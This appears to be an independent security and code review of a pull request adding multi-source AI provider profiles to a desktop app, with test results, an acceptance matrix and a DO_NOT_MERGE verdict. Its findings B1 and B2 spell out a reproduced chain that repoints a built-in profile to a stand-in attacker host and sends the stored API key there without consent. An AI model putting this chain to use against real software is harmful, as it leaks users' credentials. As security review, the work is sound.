# Independent review — Provider multi-source foundation (Issue #50, PR #51)

- Reviewer: independent review context (did not implement this work; conclusions are from GitHub, the checked-out code, the PR diff and independent executions)
- Reviewed SHA: `493e125a8905892c1397b995d6fb35893f7a5f12` (PR #51 head)
- Code SHA under test: `24efc5cb60972f28b746779ca4f32ed37d295f57` (`493e125` adds only docs and recorded evidence)
- Base: `release/morrow-v2-final-delivery` @ `3812b185398c0442fcc0d0ba5b180713cafee1d9`
- Review branch: `audit/provider-multi-source-independent-review`
- Reviewed at: 2026-11-04T10:40:23Z
- Environment: Windows 10.0.26200 x64, Node v22.23.2, npm 10.9.8; `TEMP`/`TMP` under `.tmp/es`
- Implementer's status: **PARTIAL** (unchanged)
- Reviewer verdict: **DO_NOT_MERGE** in the current form. The foundation is close and the automated evidence is reproducible, but two security issues and the v48 collision must be fixed before merge, and the acceptance matrix contains one inaccurate claim.

## 1. Independent verification performed

I did not use the implementer's tests as the only evidence. I ran the full toolchain and wrote a separate harness under `.tmp/review/` (gitignored, not part of the PR) that imports the production modules and exercises the real SQLite schema, the real `ProviderConfigService`, the real IPC handlers, the real adapter and a real loopback HTTP server.

| Command | Exit | Result |
|---|---|---|
| `npx tsc --noEmit` | 0 | no diagnostics |
| `npx vitest run` | 0 | **113 files / 1042 tests passed** (171.97 s) |
| `npm run build` | 0 | main/preload/renderer bundles built |
| provider-focused suite (11 files) | 0 | **82 tests passed** (multi-source 8, IPC 2, continuity 1, UI 4, resolver 5, security 8, openai-compatible 11, retry 13, registry 6, manual-chat 8, migrations 16) |
| `npm run eval:provider-multi-source` with `MORROW_TEST_API_KEY` from the gitignored file | 0 | **BLOCKED_QUOTA**, run `20261104T103416Z-4bc6e4bc` |

Latest CI on PR #51 (newer than the run recorded in the evidence index):

- Run: https://github.com/ve766/morrow-ai-companion-v2/actions/runs/41813632373
- Head: `493e125a8905892c1397b995d6fb35893f7a5f12`; conclusion **success**
- Jobs: `Typecheck, tests, build and smoke (ubuntu-latest)` success (113 test files, offline evals, build, Electron smoke); `Typecheck, tests, build and smoke (windows-latest)` success (113 test files, offline evals, build, smoke); `Windows upgrade path (schema migrations under the real app)` success (7 test files).

The run recorded in `docs/reports/provider-multi-source-evidence-index.md` (`41812582730`, head `020317d`) is one commit behind the current head and is not the latest run; the latest run also passes.

## 2. Acceptance matrix (independent)

| # | Acceptance item | Independent status | Evidence |
|---|---|---|---|
| 1 | DeepSeek/Spark legacy config upgrade keeps profiles/secrets | **PASS** | Real v47 DB with deepseek/spark/local rows upgraded to v48: 3 rows preserved, endpoints/models/enabled preserved, secrets readable under the same ids, unique default index present. |
| 2 | UI can create two independent custom profiles with isolated endpoint/model/secret | **PASS** | Two profiles with **distinct** fake keys: read-back isolated, update of A does not change B, delete of A removes only A's secret. IPC save/list path also verified. |
| 3 | Custom remote OpenAI-compatible relay via the product path | **BLOCKED_QUOTA** | Independent real run `20261104T103416Z-4bc6e4bc` to `https://api.supxh.xin/v1` (`gemini-3-flash`) reached the provider and classified `PROVIDER_QUOTA`. `IPC save/list=true`, `test=false`. Not PASS. |
| 4 | Local loopback OpenAI-compatible service via the product path | **BLOCKED_LOCAL_SERVICE_NOT_RUNNING** | No OpenAI-compatible local service. Port 8000 is listening but returns 404 for `/v1/models`, `/models` and `/health`; 1234/11434/5000/8080 are not listening. No mock was used. |
| 5 | SSE/non-stream, retry, cancel, error classification regression | **PASS (mock HTTP)** | Full suite plus independent adapter checks: 401→AUTH, 404→MODEL, 400/10404→MODEL, 403 quota code→QUOTA, 403 generic→AUTH, 429→retry then success (attempts=2), 5xx→NETWORK, timeout/cancel covered by the suite. Real SSE remains blocked by item 3. |
| 6 | Provider/endpoint/model switch does not reset Morrow state | **PASS** | Independent A→close/reopen→B→A on a real SQLite file: personality, memories, goals, message prefix and memory/conversation counts unchanged; derived self-model/interest counts did not reset. Provider outage did not change core state. |
| 7 | Consent binding to endpoint/model/payload; old consent unusable after switch | **PASS for chat/connection-test; GAP for discovery** | Endpoint change, model change, provider-id change, expired consent and sensitive-without-approval are all rejected. **However**, `discoverModels` performs an authenticated request with **zero** consent calls (blocking finding B2). |
| 8 | SSRF/redirect/private-network safety | **PASS at request time** | HTTP, userinfo, query, fragment, localhost, loopback, RFC1918, link-local, metadata, hex/decimal loopback, DNS private answers, empty answers and lookup failure are rejected; redirects are not followed (real 302 test: only `/chat/completions` requested, then `PROVIDER_NETWORK`); private-network is rejected. Save-time validation accepts a few forms (`https://[::1]`, `https://localhost.`) but the request-time policy blocks them with zero fetches. |
| 9 | No secret leakage; tracked/log/report scans 0 | **PASS (stored artifacts)** | 840 tracked files scanned: 0 occurrences of the real key. 145 result/transcript/doc files: 0. Latest CI logs (411,941 chars): 0 key / 0 `Authorization: Bearer`. PR diff (177,764 chars): 0. The real-run JSON/transcript contain no key, Authorization header or response text. Findings B1/B2 are credential-flow risks, not stored leaks. |
| 10 | Real relay test with credentials; otherwise BLOCKED | **BLOCKED_QUOTA** | Credential existed and was used only via `MORROW_TEST_API_KEY`; provider returned quota failure; classification is `PROVIDER_QUOTA`; no real-provider PASS claimed. |
| 11 | Local service not running is explicitly BLOCKED, not mocked | **PASS (BLOCKED)** | `BLOCKED_LOCAL_SERVICE_NOT_RUNNING`; no mock substituted. |
| 12 | Typecheck/tests/build/CI pass, no test deletion | **PASS** | Local tsc/vitest/build exit 0; latest CI run `41813632373` all three jobs success on both OSes plus the Windows upgrade path. |
| 13 | Independent reviewer reviews code and real call path | **COMPLETED** | This document; verdict DO_NOT_MERGE with specific blockers. The implementer did not self-approve. |
| 14 | PR not auto-merged, not merged to main/release | **PASS** | PR #51 remains OPEN, base `release/morrow-v2-final-delivery`; release is still `3812b18`; main was not touched. |

Overall: the PR is **PARTIAL**, as the implementer stated. It cannot be marked COMPLETE while item 3 is `BLOCKED_QUOTA` and item 4 is `BLOCKED_LOCAL_SERVICE_NOT_RUNNING`, and the code issues below must be fixed before merge.

## 3. Blocking conditions

### B1 — Built-in profile can be repurposed to an arbitrary HTTPS endpoint while retaining its credential (security)

`ProviderConfigService.saveProfile()` (`src/app/companion-service.ts:514-633`) enforces "official sourceKind requires a built-in id" but not the inverse: a built-in id (`deepseek`, `spark`, `local-openai`) can be saved with `sourceKind: 'custom-proxy'` (or `'local'`) and an arbitrary endpoint. The existing secret is kept because `hasCredential(profileId)` is true and `apiKey` is optional. The new panel renders an enabled **编辑** button for official profiles, and `fillForm()` (`src/renderer/src/provider-profiles-ui.ts:155-166`) maps `sourceKind: 'official'` to the `custom-proxy` option, so the UI itself performs this conversion.

Reproduced through the real IPC handler:

1. Save the official DeepSeek profile with a key.
2. `providerProfileSave` with `{profileId:'deepseek', displayName:'Repurposed', sourceKind:'custom-proxy', protocolId:'openai-chat-completions', endpoint:'https://relay-attacker.example.com', model:'m', enabled:true}` (no `apiKey`).
3. Result: `ok:true`; `get('deepseek')` = `{sourceKind:'custom-proxy', endpoint:'https://relay-attacker.example.com', apiKeyConfigured:true}`; the secret is still present.
4. `deleteProfile('deepseek')` then returns `FORBIDDEN`, so the new panel cannot remove the row.

Impact: the official fixed-endpoint invariant is broken, and the DeepSeek/Spark key can be reused against an arbitrary public HTTPS host. The consent preview shows the new endpoint for chat/connection tests, but the credential binding is not preserved and discovery has no consent at all (B2).

Recommended fix: reject a built-in id unless `sourceKind` matches its built-in kind (official for deepseek/spark, local for local-openai) and the endpoint matches the audited spec; disable the edit action for official profiles in the new panel (the legacy panels already edit them); and clear the stored secret whenever an existing profile's endpoint or sourceKind changes, requiring the key to be re-entered.

### B2 — `discoverModels` is a real authenticated request outside `dispatchToProvider` and outside consent (security/requirement)

`ProviderConfigService.discoverModels()` (`src/app/companion-service.ts:714-750`) calls `this.secrets.get(config.id)` and performs `GET <models endpoint>` with `Authorization: Bearer <key>` without calling `this.authorize` and without `dispatchToProvider`. The architecture document claims `dispatchToProvider` is still the single real-request exit (`docs/architecture/provider-multi-source-architecture.md:50`); that claim is false for discovery.

Reproduced after B1: `discoverModels({profileId:'deepseek'})` produced a request to `https://relay-attacker.example.com/models` with an Authorization header and **0** consent calls. Combined with B1 this is a credential-exfiltration chain reachable from the trusted renderer or the "发现模型" button.

The issue requires (B6/D) that consent, payload hash and `dispatchToProvider` remain the unified exit for all real requests. Discovery must be consent-gated (for example a `model-discovery` consent action bound to profile/endpoint/model) or must not send the stored key without an explicit consent record. The architecture/security docs must state the exception if one is intentionally kept.

### B3 — v48 collides with Stage 4 PR #40 v48; the app does not fail closed

PR #40 (`feat/stage-4-companion-confirmation-closure` @ `4284cb1b`) also defines `version: 48` (`pending-decision-terminal-state`). This branch defines `version: 48` (`provider-multi-source-profiles`). The delivery report, architecture document and baseline audit state honestly that this migration must be renumbered to v49 if #40 merges first (`docs/reports/provider-multi-source-delivery-report.md:16,76`, `docs/architecture/provider-multi-source-architecture.md:92`, `docs/audit/provider-multi-source-baseline-audit.md:55`), and the migration comment repeats it. That part is honest.

What the docs do not state is the runtime consequence: `applyMigrations` does reject a recorded v48 whose name differs, but `SqliteDatabase.open()` (`src/persistence/database.ts:103-110`) swallows that error and opens the database as schema version 48 when the numeric version is within range. Reproduced: a Stage-4-v48 database opens with `schemaVersion=48`, and `SELECT display_name FROM provider_profiles` fails with `ERR_SQLITE_ERROR`; the reverse (`applyMigrations` with the Stage-4 set over a provider-v48 database) throws `Unsupported database schema version.` but the same degraded-open fallback would swallow it. This is not a silent data loss, but it is a silent incompatible open, not a fail-closed one.

Required before merge: renumber this migration to v49 (or coordinate the merge order and renumber #40), and consider a schema-fingerprint/fail-closed check when the numeric version equals `CURRENT_SCHEMA_VERSION` but the recorded migration names do not match. Add a test for the collision.

### B4 — Acceptance matrix overstates the IPC test result

`docs/testing/provider-multi-source-acceptance-matrix.md:11` says the recorded run had "IPC save/list/test 通过". The committed result `evals/provider-multi-source/results/20261104T100603Z-b3b82e61.json` has `"test": false` (and `"IPC test error"`), and the committed transcript says `FAIL — IPC path ... {"save":true,"list":true,"test":false}`. My independent run reproduces `save=true, list=true, test=false`. The matrix must say "save/list pass; test fails with PROVIDER_QUOTA" — the BLOCKED_QUOTA status itself is honest.

### B5 — External blockers prevent COMPLETE

- Real remote: **BLOCKED_QUOTA** (independently reproduced; same endpoint digest `81f2def21ea9d6eb`, same model, no key/response text recorded). The committed evidence supports the quota classification; the specific "$0.04775 < $0.05" balance figure is not in the committed JSON/transcript (the adapter discards the body), so it is not independently machine-verifiable from the repository.
- Local: **BLOCKED_LOCAL_SERVICE_NOT_RUNNING**; no OpenAI-compatible local service exists in this environment.
- Therefore the PR remains PARTIAL; it must not be marked COMPLETE.

## 4. Non-blocking backlog

1. **`testConnection` ignores `endpointPath` and a full chat URL base.** `connectionInput()` (`src/app/companion-service.ts:415-427`) builds `${config.endpoint}/chat/completions` instead of `resolveChatEndpoint(...)`. Reproduced: a profile with `endpointPath: '/api/chat/completions'` and a profile whose base is the full `https://.../v1/chat/completions` both make `testConnection` throw `INVALID_INPUT`, while the chat path (which uses the resolver) works. The "测试连接" button therefore fails for two configurations the issue explicitly says are supported. Fix `connectionInput` to use the resolver.
2. **No duplicate/copy profile action** in the new panel (Issue E asks for 新增/编辑/复制/删除/启用/禁用). Create/edit/delete/enable/default exist; copy is missing.
3. **`isDefault` cannot be unset by saving with the checkbox cleared** (`isDefault = input.isDefault === true || existing?.isDefault === true`). There is no way to clear the default except setting another profile.
4. **Health/capabilities are reset on every save** (the candidate has no `lastTest`/`capabilities`, so the upsert writes defaults). This is conservative but discards a verified status when only the display name changes; document it or preserve when endpoint/model are unchanged.
5. **Profile id length mismatch:** `isProfileId`/DB allow 1–64 characters, but `SafeStorageSecretStore`'s identifier regex allows at most 40 (`src/security/secrets.ts:24`). A user-supplied id of 41–64 characters can be saved only with the in-memory test store; in production the secret write fails and the save rolls back. Align the limits (or generate short ids and reject long ones).
6. **Save-time endpoint validation accepts a few non-public literal forms** (`https://[::1]`, `https://[::ffff:127.0.0.1]`, `https://localhost.`); the request-time policy blocks them with zero fetches, so there is no egress, but rejecting them at save time is better UX/defense in depth. Bracket IPv6 is handled correctly at request time (`dns.lookup` strips the brackets; public literals pass, private literals are blocked), so this is only an earlier-rejection gap.
7. **`endpointPath: '/v1'` ambiguity:** with a bare base, `resolveChatEndpoint` returns `https://host/v1` (no `/chat/completions`), while with a `/v1` base it returns `/v1/chat/completions`. Document that `endpointPath` is a full path, or normalize a version-only path.
8. **Discovery hardening:** cap the response body size (currently `response.json()` is unbounded), map secret-store errors through `mapProviderSecretError`, and consider mapping 404 to a discovery-specific status.
9. **Real-run evidence completeness:** the BLOCKED_QUOTA JSON/transcript record status, endpoint digest, model, time, commit and working tree, but not the HTTP status, latency, attempts or process exit code for the failed request. Add them to the failure path; do not record the body.
10. **`speed26.toter.me` compatibility regression was not run** (Issue F asks for it if credentials are valid); there is no BLOCKED/NO_SECRET entry for that endpoint.
11. **Real-run fidelity:** the eval uses `MemorySecretStore` and calls the IPC handlers directly, not the Electron `SafeStorageSecretStore` or the actual renderer form. The evidence is handler-level product wiring plus a separate UI unit test, not a full UI→preload→main→OS-store real run. State this limitation explicitly or add an Electron smoke with a local custom profile (no network).
12. **Continuity coverage:** the implementer's continuity test covers personality/memory/goals/messages but not self-model entries or interests; my independent test compared those counts and found no reset. Add them to the product test.
13. **Test key isolation:** the implementer's two-profile test uses the same fake key for A and B; use distinct keys to prove isolation (my independent test does).
14. **CI/evidence staleness:** the evidence index records run `41812582730` at `020317d`; the latest run is `41813632373` at `493e125` (success). Update the index. The acceptance matrix's "CI 待 PR" is stale.
15. **Provider error messages are DeepSeek-specific** ("请先配置并启用 DeepSeek API 密钥", "DeepSeek 未找到所选模型") even for custom profiles; make them provider-neutral.
16. **Residual SSRF ranges:** `100.64.0.0/10` (CGNAT), `64:ff9b::/96` (NAT64) and `2002::/16` (6to4) are not classified private. They are not in the issue's explicit list, but a defense-in-depth review should consider them. The documented DNS-rebinding residual risk is honest.

## 5. Honesty review of the delivery documents

- **v48 collision:** honestly stated in the baseline audit, architecture, delivery report, work log and migration comment; the renumbering requirement is explicit. Missing: the silent degraded-open consequence (B3).
- **Acceptance matrix:** row 3 overstates the IPC test as passed (B4); row 12 says CI is pending although the latest CI passed; row 13 was PENDING before this review and is now completed by this document. Other statuses (BLOCKED_QUOTA, BLOCKED_LOCAL_SERVICE_NOT_RUNNING, PARTIAL) are honest.
- **Real-run evidence:** the BLOCKED_QUOTA classification is honest and independently reproduced; no real-provider PASS is claimed. The exact balance and provider code string in the narrative are not in the committed JSON/transcript; the docs correctly say the 09:52 probe was not final-SHA evidence.
- **Secret handling:** no key in tracked files, results, transcripts, docs, CI logs or the PR diff. The key was injected only via `MORROW_TEST_API_KEY`; I did not print it or write it into any file.
- **Architecture claim:** "dispatchToProvider 仍是唯一真实请求出口" is inaccurate because of `discoverModels` (B2).
- **Work log:** the timeline, commits and 113/1042 result match my execution. The "provider 定向 10 files / 65 tests" claim is a subset; my focused run was 11 files / 82 tests.

## 6. Recommendation

Keep PR #51 OPEN and unmerged. Fix B1, B2, B3 and B4, then re-run the full CI and the real-run evidence (or record BLOCKED_QUOTA again), update the acceptance matrix and architecture claim, and request a re-review. The foundation (domain model, migration, resolver, adapter reuse, SSRF at request time, secret rollback, continuity, UI/IPC wiring) is otherwise sound and the automated suite is reproducible.

Until then the correct status remains **PARTIAL**, and the reviewer verdict is **DO_NOT_MERGE**.
